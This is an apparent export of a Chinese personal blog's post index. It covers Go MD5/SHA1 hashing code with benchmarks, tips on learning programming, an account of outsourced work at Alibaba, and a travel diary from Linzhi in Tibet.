        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang计算MD5的写法和性能</title>
    <url>/2020/coding/golang/md5.html</url>
    <content><![CDATA[<p>用过PHP的童鞋知道在PHP里面md5很简单，是一个内置函数，可以直接调用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jun:~$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> md5(<span class="string">"12345"</span>);</span><br><span class="line">827ccb0eea8a706c4c34a16891f84e7b</span><br></pre></td></tr></table></figure>

<p>纠正一个错误的说法，很多人一直把md5叫作加密算法，实际上md5并不是加密，它既不是对称加密，也不是非对称加密，它只是一个摘要函数，一般被用于签名或者校验数据完整性。</p>
<p>虽然现在有文章说不推荐使用md5了，因为碰撞几率比较大，实际上，这个几率非常非常非常低，大只是相对于其它摘要函数来说，纯自然的情况下基本不可能碰撞，虽然可以用工具构造出来，但非常复杂。如果实在不放心，可以用sha1或者sha256，或者两者集合起来用，速度会慢一点，但安全性高一点，总之，md5由于速度快，简单易用，现在用的还是蛮多的。</p>
<a id="more"></a>

<p>言归正传，在Go的标准库里面并没有md5这个函数，但是在<strong>crypto</strong>包里面确实有相关实现，需要自己动手组装拼凑一下，网上流传的写法有很多种：</p>
<h2 id="1-第一种"><a href="#1-第一种" class="headerlink" title="1.第一种"></a>1.第一种</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MD5</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    hash := md5.New()</span><br><span class="line">    _, err := hash.Write([]<span class="keyword">byte</span>(s))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    sum := hash.Sum(<span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">"%x\n"</span>, sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>平时用到可能只是copy过来，没仔细看，今天来仔细看一下，首先，这个 md5.New() 返回的是一个结构体 digest：</p>
<img src = "/images/2020-03-06_21-34.png" />

<p>这个结构体成员啥意思呢？其实细说起来，这和md5的算法有关了，咱也不知道，咱也不敢问！</p>
<p>但是仔细看一下这个结构体的方法，你会发现有一个叫Write，还有一个叫Sum，如果你英语不错，你可以看懂，Write就是把数据写到刚才这个结构体里面，先甭管它咋写，肯定是有算法规则，感兴趣可以研究研究。Sum稍微有点不一样，但是有一个参数，和一个返回值，这个方法的意思是把参数追加到进去并且返回摘要，由于我们之前已经写进去了，所以参数为nil即可。</p>
<img src = "/images/2020-03-06_21-39.png" /> 

<p>可见，一个md5方法Go就整了6行代码，老板看你代码写这么多，又可以加薪了，Go确实是好语言。</p>
<h2 id="2-第二种"><a href="#2-第二种" class="headerlink" title="2.第二种"></a>2.第二种</h2><p>如果你仔细看了这个包里面的 md5.go 文件，你会发现最下面有一个公开的方法Sum，仔细一看，这就是刚才我写的那个简化版：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Sum returns the MD5 checksum of the data.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sum</span><span class="params">(data []<span class="keyword">byte</span>)</span> [<span class="title">Size</span>]<span class="title">byte</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> d digest</span><br><span class="line">    d.Reset()</span><br><span class="line">    d.Write(data)</span><br><span class="line">    <span class="keyword">return</span> d.checkSum()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们的方法可以简化为：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MD5</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    sum := md5.Sum([]<span class="keyword">byte</span>(s))</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">"%x\n"</span>, sum)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然sum变量在这２个方法里面都是多余的，可以简化为一行代码即可。</p>
<h2 id="3-第三种"><a href="#3-第三种" class="headerlink" title="3.第三种"></a>3.第三种</h2><p>还有一种方式是使用io库的方法往里面写，主要是因为degest实现了<strong>io.Writer</strong>接口</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MD5</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    hash := md5.New()</span><br><span class="line">    _, _ = io.WriteString(hash, s)</span><br><span class="line">    <span class="keyword">return</span> hex.EncodeToString(hash.Sum(<span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中最后Sprintf方法是为了把结果转化成小写十六进制，也可以用<strong>hex.EncodeToString</strong>方法替代。</p>
<h2 id="4-性能对比"><a href="#4-性能对比" class="headerlink" title="4.性能对比"></a>4.性能对比</h2><p>这几种方式大同小异，理论上讲应该没有什么性能差距，不过既然Go自带Benchmark，我们就测一下吧：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkMD5</span><span class="params">(b *testing.B)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        MD5(<span class="string">"12345678901234567890"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jwang@jun:~/Documents/Work/learnGo/Std/md5$ go <span class="built_in">test</span> -bench=.</span><br><span class="line">goos: linux</span><br><span class="line">goarch: amd64</span><br><span class="line">BenchmarkMD5_1-12       10000000               359 ns/op</span><br><span class="line">BenchmarkMD5_2-12       10000000               356 ns/op</span><br><span class="line">BenchmarkMD5_3-12       10000000               163 ns/op</span><br><span class="line">BenchmarkMD5_4-12       10000000               296 ns/op</span><br><span class="line">PASS</span><br><span class="line">ok      _/home/jwang/Documents/Work/learnGo/Std/md5     11.757s</span><br></pre></td></tr></table></figure>
<p>不测不知道，一测吓一跳，其实前2个方法差不多很正常，但是第三个方法性能很好，其主要原因是因为Sprintf的性能比较差导致，不过<strong>md5.New()</strong>这种写法也比较慢。</p>
<h2 id="5-最佳写法"><a href="#5-最佳写法" class="headerlink" title="5.最佳写法"></a>5.最佳写法</h2><p>最终得出结论，性能最高的md5写法是这种，推荐大家使用：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MD5</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span>  &#123;</span><br><span class="line">    sum := md5.Sum([]<span class="keyword">byte</span>(s))</span><br><span class="line">    <span class="keyword">return</span> hex.EncodeToString(sum[:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-Sha1"><a href="#6-Sha1" class="headerlink" title="6.Sha1"></a>6.Sha1</h2><p>最后说个题外话，Go里面Sha1的写法和Md5几乎一致，只需要要把md5改成sha1即可：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sha1</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span>  &#123;</span><br><span class="line">    sum := sha1.Sum([]<span class="keyword">byte</span>(s))</span><br><span class="line">    <span class="keyword">return</span> hex.EncodeToString(sum[:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我也测了一下性能，它们之间的差距很小，md5是163ns/op，sha1是206ns/op，毕竟sha1比md5长一点。。。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title>如何高效的学习编程？</title>
    <url>/2020/life/how-to-learn.html</url>
    <content><![CDATA[<p>今天想聊一聊学习这个话题，理想情况下，每个人都应该有适合自己的一套学习方法和节奏，主要因为不同人对知识的理解和吸收速度不一样，举个非常简单的例子，在网上看视频或者电影，有些人觉得2倍速播放刚刚好，而有些人甚至还要降速才能看明白，才能Get到点。即便如此，我觉得有些学习的经验和方法是可以共享的，虽然它不一定适合所有人。</p>
<p>人一生都在学习，学习不一定是在课堂上，特别是在互联网时代，我们可以随时随地打开手机观看各种课程，尤其是在编程行业，更需要不断持续的学习才能保持竞争力。我也是自学入行编程，期间也看过很多网上的视频教程，平时学习的时候也经常看一些博客教程，可以说现在也基本上是靠自学成长，颇有感触。</p>
<a id="more"></a>

<p>在学生时代，我也算是班级里面名列前茅的选手，在别人眼里我很厉害，每次考试都能考一个非常高的分数，但是我自己却感觉很轻松，我每天和其它同学一样，一起上课学习、按时完成老师安排的作业，没有什么额外的事情。而我周围的也有些同学非常努力，早起晚睡，周末还会上家教，但成绩却一般般。举一个不太恰当的例子，10万块钱在你眼里可能是巨款，但是在有钱人的眼里那只是零花钱。所以在一些牛人的眼里有些问题太简单了，他们可以分分钟钟给你手写一个翻转二叉树算法，这真的不是他们很努力，有些只不过是天分而已，而你刷了几百遍leetcode依然达不到人家的水平。</p>
<p>正视智商上的差距并不意味着努力没用，因为在大部分时候，我们远远没有达到需要拼智商的地步，努力能够弥补很多差距，即使智商很高的人也需要努力，不然也就是当代“伤仲永”而已。</p>
<h1 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h1><p>在我很早学习Java的时候，我在网上看过一个叫韩顺平的人的视频教程，他在开课之前有一小节专门讲了如何高效的学习编程这个话题，他总结了几个点，我觉得非常有道理，后来得知，他不仅仅教Java，也教PHP、Linux、Go，但是每次开课的时候都会讲一下这几点学习方法，个人感觉这几点讲的非常好，这里和大家分享一下：</p>
<img src="/images/2020-03-03-1.png" /> 

<ul>
<li><p>高效而愉快的学习</p>
</li>
<li><p>先建立一个整体的框架，然后细节</p>
</li>
<li><p>在实际工作中，要培养用到什么，能够快速学习的能力</p>
</li>
<li><p>先know how，再know why</p>
</li>
<li><p>软件编程是一门“做中学”的学科，不是会了再做，而是做了才会</p>
</li>
<li><p>适当的囫囵吞枣</p>
</li>
<li><p>学习软件编程是在琢磨别人怎么做，而不是我认为应该怎么做的过程</p>
</li>
</ul>
<blockquote>
<p>韩顺平是清华大学毕业，之前一直在某智任教，后来听说自己开设了一个培训班，但是经营不善倒闭了，现在又重返课堂了。</p>
</blockquote>
<p>仔细想一下，这些点讲的非常有道理，很多人在学习的时候往往忽视了整体，盯着一个点在那死磕，有点盲人摸象的感觉，比如你要学习使用一门语言，你首先应该知道这门语言适合干啥，然后再去了解大体有哪些特点，再去写一个最简单的例子，学习基本语法，具体的细节等以后渐渐熟悉了再去学习。</p>
<p>我们不能要求自己一上来就把所有的功能都学会了再做事情，编程行业发展到现在每一个细分领域只要你想去研究学习都有一大堆东西，需要大量时间，很多东西都是发展了很多年不断迭代的结果。你不能要求自己一上来就写一个没有bug、面面俱到的代码，但是你可以去不停改进优化你的代码。</p>
<p>What？Why？How？是什么？为什么？怎么用？这一条几乎可以适用于各行各业,我见过很多人，一上来就对着教程照葫芦画瓢，完全没有理解，效率自然不高。</p>
<h1 id="类比"><a href="#类比" class="headerlink" title="类比"></a>类比</h1><p>学习最快的方法就是用一个已知的东西去理解一个未知的东西，这个方法大部分情况下都是可用的，比如说你学习完了PHP再去学习Java或者Go，你会发现基本语法差不多，所以上手很快。</p>
<p>在编程行业，很多经验都是相互借鉴的，比如说PHP的composer和Node的npm它们都是一个包管理工具，是用来解决包依赖问题，一样功能的还有Linux操作系统里面apt和yum。编程里面常常提到的设计模式就是一种共同性的思想，虽然不同语言的具体实现可能有所差异。</p>
<p>即使不是同一个行业，也有些思想可以借鉴，比如，有人在讲述buffer和cache的区别的时候举了一个这样的例子，cache就相当于京东在每个城市周边的仓库，它可以快速的把你买的东西寄到你手上而不用从厂家发货。</p>
<p>但IT行业是一个非常喜欢吹牛逼的行业，经常会发明一些新鲜的词汇来唬人，比如云计算、云原生、5G云、大数据、人工智能等等。可能这个和风投资本有关，创业的人需要拿出一些看起来很厉害的东西唬住投资人，如果你仔细了解过这些“高大上”的词汇背后，你会发现其实还是熟悉的东西。</p>
<h1 id="网课"><a href="#网课" class="headerlink" title="网课"></a>网课</h1><p>现在知识付费非常火，卖课的广告到处都是，很多技术公众号天天也在贩卖焦虑，然后卖课。卖网课几乎是一个一本万利的生意，你只要录制一次就可以卖给N人，相对于书本来说，连印刷的成本都省了。</p>
<p>在早期我也看过很多视频教程，很多确实非常有用。但我现在看来，视频这种形式比较适合入门初学者，它可以快速的帮助你了解学习一门知识，特别是你啥也不会的时候，跟着视频学会快很多。</p>
<p>但是当你进入一个行业几年之后，视频课程基本上不是一个很好的选择了，大部分课程讲的东西都比较宽泛和全面，实际上你不一定用得到，很多人就听了一些公众号的忽悠，买了很多课，有些根本没时间看，有些看完时间一久就忘了。所以我建议还是得结合实际应用有针对性的去学习，很多优秀的开源项目的官方文档已经写的非常清楚了，有些怕你不会用连demo都给你写好了。</p>
<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><p>记笔记是个好习惯，我记得以前上学的时候很多同学记笔记记的非常认真，老师在黑板上写，同学都在下面抄，一字不漏。老师经常说让大家不要照抄，不要把时间浪费在抄笔记上面，要多注意老师讲的东西。毕竟那会教育条件很差，现在估计学校里面应该都是直接投影仪放PPT了，学生也不用抄笔记了，直接拷贝就行了。</p>
<p>不过我还是建议大家有时间可以写点总结性的笔记，也可以叫作博客，不一定要写出多么有深度，你只需要记录自己学到一些东西或者自己的一些想法即可，因为有时候很多东西你感觉你自己学到了，但是让你写出来就会不一样了，写作的过程通常也是一个思考的过程，有助于查漏补缺。</p>
<p>所以如果有时间，建议抽出时间不妨就某一个技术点写出你自己的理解，写得好还是可以帮助别人，何乐不为呢？</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>谈一谈阿里外包工作</title>
    <url>/2020/life/2019-4.html</url>
    <content><![CDATA[<p>之前写过几篇文章名字叫<a href="https://wangbjun.site/2020/life/2019-1.html">《一个野生程序员的北漂之路》</a>，这篇文章应该算是后续吧，聊聊我如何进阿里外包，主要是结合我的经历和我所了解的一些事实谈谈我的感受和看法，仅供其他朋友参考。</p>
<h2 id="上家公司残局"><a href="#上家公司残局" class="headerlink" title="上家公司残局"></a>上家公司残局</h2><p>看过前面文章的人应该知道我上一家公司因为是P2P行业受到打击，目前已经处于立案阶段，整个公司几百员工都失业了，我也不例外。刚开始我对公司还抱有希望，在家休息等待了2周之后我才明白公司是真的没了，自己找工作吧，当时公司为了不仅欠了我们半月工资，而且连社保也没钱缴纳（财务账户被冻结），甚至都无法给员工办理离职（公章被扣押），没人有操心这几百号员工怎么办，但是社保断了对很多人有很大影响，很多人都在问怎么办，最后公司的HR出来告诉我们可以自己找人代缴，但是由考虑到风险，需要员工签一个离职声明，然后公司才可以把社保做减员处理，于是大家争相签离职声明。</p>
<a id="more"></a>

<p>签了这个声明之后，基本上就和公司没关系了，但是公司无法开离职证明，所以找工作的时候得自己解决。其实从法律上说离职证明不是必须的，不过从公司的角度说，如果你同时在2家公司任职会对公司不利，有些公司会让你签一个免责声明，但不同公司的要求不一样，有些公司比较看重。</p>
<h2 id="面试经历"><a href="#面试经历" class="headerlink" title="面试经历"></a>面试经历</h2><p>后来，我出去面试了一周，面了10来家公司，有些是小公司，但是也有一些相对大一点的公司，比如百度、360等，面试的岗位有PHP和GO，不过最终结果都一样。一开始我就不抱太大期望，因为这会距离过年只有20天左右，年终招人的公司并不多，很明显有些公司就是走过场或者传说中的刷KPI。</p>
<p>前面说过，我自己的硬件条件很差：非科班、非重点、转行，而且之前的工作履历也一般，很多面试官拿到简历问我是什么专业，一听是非计算机专业就立马不一样了，其中有一个面试官比较实诚，直接和我说你这个专业让我觉得不踏实。另外就是，我自己准备的也不够充分，实力有限，打扰了，可能他们想招的都是高端人才，我要求工资上限才达到他们的下限。</p>
<p>但也有比较Nice的面试官，比如百度的，当时是去面的百度文库，PHP在百度有大规模应用招人还是挺多的（后续和面试官聊的时候发现也在转Go），聊的时候期间我问了一个有意思的问题，我说：“听说大厂用PHP和一般公司都不是一个用法，你们都是用的扩展，是真的吗？”他说也并不是，只有极少数对性能要求非常高的模块会用扩展写，大部分都是普通PHP代码，但是我们用的是自己写的框架。二面的应该是一个leader，一开始就问了一些非技术内容，然后问了一些技术内容，还让在纸上写一些东西，不过一个快排算法没写出来，那天刚好是元旦前一天，面试官说：“今天是2019年最后一天，非常有意义，马上下班去跨年了，如果你刚才那个算法写好了我就让你过了，不过也不一定，我待会和一面沟通一下，有消息再通知你”。虽然凉了，但是百度这2个面试官给我感觉比较尊重人，面试过程比较轻松，不像是有些公司的面试官盛世凌人，比如在问到我不会的问题时，我通常会说这块我确实没了解过，您能不能大概给我介绍下？很多面试官会说自己回去百度、自己回去再看看吧，极少数会给你解答。</p>
<h2 id="技术水平"><a href="#技术水平" class="headerlink" title="技术水平"></a>技术水平</h2><p>有一个问题特别有意思，在和百度一面聊的时候，他问我你觉得自己技术大概在什么水平，这个问题也有很多面试官问过，我一般会说中级，他说我觉得你差不多能达到高级、中高级，我说高级那不得熟知源码，他说熟知源码那得资深了。我并不太了解这个等级划分，我一般理解会有3个档次，初、中、高级，比如很多招聘会写高级开发工程师，但是不同公司的标准好像不一样，百度会有自身的T级别，而阿里则有P级别，比如在阿里，p5一般是高级，p6资深，p7技术专家，我猜那个面试官说的应该是按百度级别划分，但百度的我没了解。我记得有一次一个面试官问过我如果我要到资深的水平需要多久，我说大概要10年，但是我这时候理解的资深是相当于最高级的技术水平。不过有一点大家需要了解，国内很多大厂的技术定级，并不是完全是看技术，越往上往往靠的是管理，纯技术基本上没有活路。</p>
<h2 id="为什么要进外包？"><a href="#为什么要进外包？" class="headerlink" title="为什么要进外包？"></a>为什么要进外包？</h2><p>说到外包，其实一开始我是拒绝的，直到我有一个朋友在阿里外包（Web前端），她们是和阿里正式员工一起办公，外包公司是南京的一家公司，社保也不是最低缴纳，工作还挺轻松，一般晚上准时6点半下班，周末双休，极少加班，加班可以调休，看上去并不是很差。我知道，网上一直对IT外包评价非常差，99%的人不建议去外包岗位，除非无路可去，否则不要考虑外包，所以以前找工作的时候只要是外包的我一概不考虑，但是这次我想试一试。</p>
<p>抱着试试看的态度，我答应了一家武汉的外包公司的面试，面试岗位是阿里某部门Go语言的项目，其中主要原因是我对Go比较感兴趣，也想写Go。面试是电话面试，前后来了2个，电话都是来自杭州阿里巴巴的，如果说我找工作面其它公司的难度是10，那么外包可能只有3，结果很顺利的就到了谈薪的阶段，果不其然，工资确实压的很低，而且其它待遇基本为0。外包好像都会有一个套路，那就是开始给你压到很低，如果你不同意他们就会说我帮你申请特批，但是即使明面上的薪资达到了我的要求，但是其它福利基本为0，本质上还是降薪了。这里其它福利就是5险一金最低缴纳、没有任何补助、只有12薪、没有年终奖和奖金。</p>
<p>我在面外包之前也做了一些功课，比如和你聊的人，也就是外包的人事专员他们只负责招聘，招聘入职之后就和她没有什么关系了，他们一般会和你说一些“空大假”话，最常见的就是进大厂外包表现的好有可能转正，但是据我了解，这个概率很低，而且基本上是副作用，如果你想正式进大厂，反而不能去外包，其实并不是技术原因。有网友说，如果一个外包员工辞职之后再入职变成正式员工，你觉得外包公司会怎么想？这相当于大厂在和外包公司抢人，但是这些大厂和这些外包公司都是合作关系，就算明面上不说，估计私底下也签了协议。我觉得说的没毛病，不敢说绝对，但是现在通过外包进大厂其实很难，现在竞争激烈，大厂从来不缺人，其实还有另外一个原因，那就是大部分外包员工水平都很差。不过我确实有了解到一个通过外包进小米最后转正的人，PHP岗位。</p>
<h2 id="外包可能的坑"><a href="#外包可能的坑" class="headerlink" title="外包可能的坑"></a>外包可能的坑</h2><p>总之，在薪资问题上和这个人事专员以及她的上级领导几轮较量之后，她说可以给到我的薪资要求，但是我却说了No，因为我发现这家武汉的外包公司劣迹斑斑，在知乎上有很多“黑稿”，而且有理有据。最后我和这个人事专员摊牌了，她说她知道，她给我的辩解是如果真如网上说的这么差，那为什么还有这么多员工呢？为什么阿里依然和他们合作呢？</p>
<p>我无言以对，但是这些纠纷里面提到的问题大多集中在几个方面，我认为基本可信，比如说加班工资，很多大厂加班都很严重，外包也不例外，但是正式员工毕竟福利好，加班也是自愿加班，外包工资本身都很低，再996有点说不过去吧？于是有些外包公司就会承诺有加班费（一般都是调休），但是这笔加班费你想拿到有点难，要经过层层审批，很久很久，久到最后离职了还没拿到。还有一些控诉内容是调岗问题，大家要知道一个公司之所以招外包就是为了省钱，而且更加灵活，项目需要人的时候就招外包，项目不要人就可以“开除”外包，虽然我不知道外包公司和这些大厂签的什么协议，但是可以确定的是如果你外包的项目结束了，不需要人了，公司会让你去面试其它公司，假如很不幸没有公司招人（外包岗位都是一个萝卜一个坑）或者你没面试上，外包公司就会让你待岗，只会给你发一个基本工资，大概只有几千块，如果你仔细看一下外包合同，你会发现这个薪资构成就是这么写的，所以很多纠纷都在这里。</p>
<p>但是招聘你的时候，外包的人事专员都会告诉你这个项目是长期项目，他们和公司的合作是长期合作，其实话虽这么说，事实大家都清楚，没有什么是长期固定不变的，我相信这些纠纷可能不全是外包公司的问题，但是看判决书大部分都是员工胜诉，你们说公司有没有问题呢？</p>
<h2 id="再面外包"><a href="#再面外包" class="headerlink" title="再面外包"></a>再面外包</h2><p>这会距离过年还有2周时间，我承认我是有私心的，觉得当时工作反正不好找，也不想那么早回家，就先进外包干着，还有免费过年假期，万一太坑就明年再找，这家外包公司名字叫xx国际，在外包行业知名度比较高，巧的是面试的岗位和上次是同一个项目，但是好像不是一个部门，因为给我打电话面试不是同一个人。2轮电话面试轻松拿下，根据人事专员反馈阿里那边定级是高级，但是给的薪资我就呵呵了，脉脉应届生水平都不如，我懒的浪费时间应对他们的套路了，就直接说了最低数，低于这个数就别谈了。不知道是他们真缺人还是年底也不好招人，最后答应了，但是人事专员给我反馈说这个薪资属于他们的资深水平，需要特批，走一个流程，我说你们怕不是对资深有什么误解，她说他们和阿里签的什么框架协议就是这么规定的。最后她上级还打电话和我做个君子协议，意思说他们提申请，批下来我一定得去，不能放鸽子，这又是什么套路？</p>
<p>但是这个流程批了差不多一个星期，最后离过年还有一周的时候才正式入职，这中间有什么套路我就不清楚了，大公司OA流程确麻烦，那个人事专员确实没骗我，一直说在催，说什么领导出差、开年会，打电话也没人接，就算套路也是他们公司上层的旨意，但是都答应了我也不好意思再反悔了，就这么等了一周。</p>
<p>这里普及一下，干外包你需要面对2个公司，一个是你的外包公司也就是和你签合同给你发工资的公司，一个是你工作的公司也就是你真正上班的地方，比如阿里、百度，这种外包形式也叫人力外包、人力派遣。外包公司基本上都是听大厂安排，比如说此次疫情放假、健康打卡都是阿里安排的，外包公司基本上就是传话筒，虽然是传话筒，但是依然无法无视他们。</p>
<p>简单来说，你需要面对具体2个人，一个是你在大厂的主管，他负责给你安排工作、决定你的业绩考核，另一个是外包公司的接头人，他一般是给你传达一些公司的通知安排。我的主管在面试过程中还特意强调，他说：“阿里的正式员工招聘流程非常复杂、非常长，我们也想通过外包来做一些筛选，如果表现的好有机会转正，但是我不保证，只是说有这个可能”</p>
<h2 id="外包加班吗？"><a href="#外包加班吗？" class="headerlink" title="外包加班吗？"></a>外包加班吗？</h2><p>目前我还没加过班，原因很简单，我年前只工作了几天，那时候很多人都请假提前回家了，所以也没安排什么工作，而年后这段时间一直在家远程办公，工作量也很少，但是这不代表以后不加班，但是我之前问过我主管，他说没事可以早点走，但是他们一般都是9点以后走，阿里正式员工996毫无毛病。</p>
<p>但是我那几天刚好认识了几个从国门大厦过来在一起办公的不同部门的外包同事，他们刚好是我之前说的第一家武汉外包公司的员工，他们说他们主管要求必须待到9点之后，而且10点之后才算1个小时加班，可以调休。所以，这个问题没有固定答案，很多大公司内部不同部门也不一样，有些部门加班，有些不加班，如果非得说根据什么决定，那只能说是看主管，有些主管天天盯着你，而有些主管只要你把工作按时完成就行。</p>
<h2 id="外包工作地点"><a href="#外包工作地点" class="headerlink" title="外包工作地点"></a>外包工作地点</h2><p>这点只针对阿里外包有点用，一般来说，阿里外包都在国门大厦办公，那个地方是所有外包集中办公的地方，平时沟通的话主要通过远程视频，而阿里正式员工都在望京上班，望京有金辉大厦、阿里中心A、B座，但是也有部分的外包员工固定在望京上班，而且是和正式员工一起办公。</p>
<p>但是也不是绝对的，如果你在国门大厦，有时候主管会要求你来望京办公，这时候只能给你办一个访客证，阿里的管理特别严格，保安也很敬业，访客必须由正式员工带进访客专用电梯。而且这时候由于你没有固定工位，你只能去会议室办公，所以在国门大厦办公的外包基本上是来回于国门大厦和望京之间。为什么要这么做呢？其实是需求比较多的事情主管找机会盯着你，在国门大厦办公基本上没人管，考勤只看打卡记录，你没事干下去放放风，溜达一圈都可以。</p>
<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>总得算起来，我目前也才上班一个多月，说起来也不算有什么发言权，但是还是想说一点，我不知道是阿里对信息安全要求非常高还是只针对外包，比如说电脑必须安装一个监控软件、不能安装微信、QQ，不能干工作之外的事情，还有一些比如说不能透露组织架构、透露工作内容等等，虽然说这些措施有点严格，但基本上还算合情合理。</p>
<p>所以这里面我只谈感受，首先，我的主管人比较随缘，很好说话，也很客气，其次，关于网传歧视外包员工这件事，目前没有感受到，主要是不在一起办公，目前只和他们一起吃过一次饭，确实没啥聊的，毕竟不熟，平时主要靠钉钉沟通，工作是工作，对事不对人。</p>
<p>不知是我的错觉还是阿里的文化如此，他们都喜欢给人点赞，每次解决一个问题或者完成一个工作，他们都会给你点赞，就是大拇指那个表情，我承认赞扬人是个美德，但是我平时很少赞扬人，所以注意到了这一点。</p>
<p>阿里是一个业务驱动的公司，当然这也没什么可说的，国内的公司都是业务驱动，以前在网上还看过一些《阿里巴巴的开发手册》，进去发现这和手册上说的不太一样，没见到规范在哪。。。一切以KPI为导向，但好像对外包没有KPI要求，为了完成KPI，996又有何怨言呢？</p>
<p>网上有些东西没说错，比如外包主要是在干一些边边角角的不是很核心的事情，比如说前端页面、一些增删改查的接口或重复性的工作。</p>
<p>至于我会在这里干多久，我也不知道，受现在疫情影响，经济环境差，或许我还会继续干下去，有时候一件事刚开始干起来可能很不爽，但是时间干的越久你会发现渐渐适应了，变成你的新舒适区了。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>那些年，318徒步搭车之旅（二）</title>
    <url>/2020/life/walk-on-the-318-road-1.html</url>
    <content><![CDATA[<p>每个人对旅行都有自己想法或出于各种目的，对于我当时来说，我并不完全是在旅行，只是把工作和对自由的追求结合在一起。但在这几年的旅行中，我都是独自一人踏遍大江南北，期间也遇到很多和我一样一个人出来旅行的人，我虽不善于交际，但是也在途中结识不少，大多萍水相逢，随后结伴而行度过一段时光，最后各奔东西，相忘于江湖。。。</p>
<a id="more"></a>

<p>在Ta们中，有人是纯粹出来旅游散心，有人是挑战自我，有人是对自然的热爱，有人是为了结交更多的朋友，也有人是在躲避生活。记得有一次在丽江一家青旅认识一位小姑凉，她说她在读高三，看长相似乎与我年龄相仿，曾一起骑车游逛古镇，后来听说她被她爸“抓”回去了，原来她父母离异，她这次是私自离校出来玩，她爸报警之后通过公安局查到青旅，做飞机从千里之外上门把人带走了。一个人出去旅行的人往往都有自己的故事，Ta们也许是习惯一个人，也许是追求流浪的状态，或许是想找个人倾诉，或借机摆脱烦恼，无论如何，这都是Ta们的旅行。</p>
<p>时间回到林芝，咱们继续说318的故事，林芝算是西藏地区非常大的一个城市，四面环山，云雾缭绕，旁边一条河流流过，自然环境非常好，本地也没什么工业，空气质量非常好，但是湿度也大，林芝这属于亚热带气候，夏天的时候下雨，雨蒸发变成云雾，然后又变成雨，一天可以下好几次雨。</p>
<img src="/images/2020-02-26-1.jpeg" /> 

<img src="/images/2020-02-26-2.jpeg" /> 

<p>我在林芝总共待了2天，随处逛了下，整个城市是一个严重依赖外部资源输入的地方，只有往西可以去西藏，往东就是2000多公里的318国道。期间去了一个国家森林公园，站在山上俯视了下整个城市，可以看见整个城市在一片河滩冲积平原上面，有很多在建的工程。</p>
<img src="/images/2020-02-26-3.jpeg" /> 

<img src="/images/2020-02-26-4.jpeg" /> 

<p>这座山名字叫作“比日神山”，可能是当地藏族人民的神山，所以在山上的栈道两边全部挂满了经文，这在西藏非常常见！</p>
<img src="/images/2020-02-26-5.jpeg" /> 

<img src="/images/2020-02-26-7.jpeg" />

<p>这条桥叫作八一大桥，其实最早林芝市也叫八一镇，只不过发展的比较大就改成市了。</p>
<img src="/images/2020-02-26-6.jpeg" /> 

<p>刚刚去Google卫星地图上面看了下，发现虽然5年过去了，似乎变化并不大，从卫星地图上也可以看出来整个城市围绕着河道而建，这条河最终流向印度洋。</p>
<img src="/images/2020-02-26-9.jpeg" /> 

<img src="/images/2020-02-26-8.jpeg" /> 

<p>这样的城市看起来很好，但是似乎不是太适合现代人，除了空气比较好之外，周围被大山包围，阳光并不多。另外这地方太过偏远，离拉萨还有几百公里，网上买东西太慢，上网的话网速也慢，如果要去别的地方不坐飞机就更远了，虽然有机场，但是票价不便宜，另外各种生活物资，比如蔬菜、水果、海鲜水产基本上全靠外部输入，种类少价格高，可能适合有钱人买套房在这偶尔坐飞机过来度假，待上一段时间，感受一下慢生活。</p>
]]></content>
      <categories>
        <category>Life</category>
